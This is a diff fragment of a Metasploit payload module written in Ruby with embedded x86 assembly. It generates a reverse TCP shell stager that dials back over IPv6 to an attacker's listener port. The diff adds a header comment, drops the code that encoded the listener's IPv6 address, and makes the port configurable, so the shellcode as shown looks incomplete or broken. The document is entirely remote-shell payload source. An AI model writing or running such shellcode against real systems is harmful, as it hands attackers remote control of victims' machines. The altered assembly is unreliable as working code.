@@ -1,4 +1,8 @@
 ##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
 
 require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
@@ -26,13 +30,9 @@ module MetasploitModule
   end
 
   def generate_stage
-    my_ipv6 = IPAddr.new(datastore['LHOST']).hton.scan(/..../)
-    first_dword  = my_ipv6[0]
-    second_dword = my_ipv6[1]
-    third_dword  = my_ipv6[2]
-    fourth_dword = my_ipv6[3]
-    tcp_port = [datastore['LPORT'].to_i].pack('S>')
-
+      temp =  [datastore['LPORT'].to_i].pack('S>') 
+      tcp_port = temp.unpack('H*')
+      
     payload_data =<<-EOS
         xor  ebx,ebx
         mul  ebx
@@ -58,13 +58,13 @@ module MetasploitModule
         push ebx
         push ebx
 
-        push #{fourth_dword}
+        push ebx
         push ebx
         push ebx
         push ebx
 
         push ebx
-        push.i16  0x9a02 
+        push.i16  0x#{tcp_port}
         push.i16 0xa
         mov ecx, esp
         push.i8 0x1c
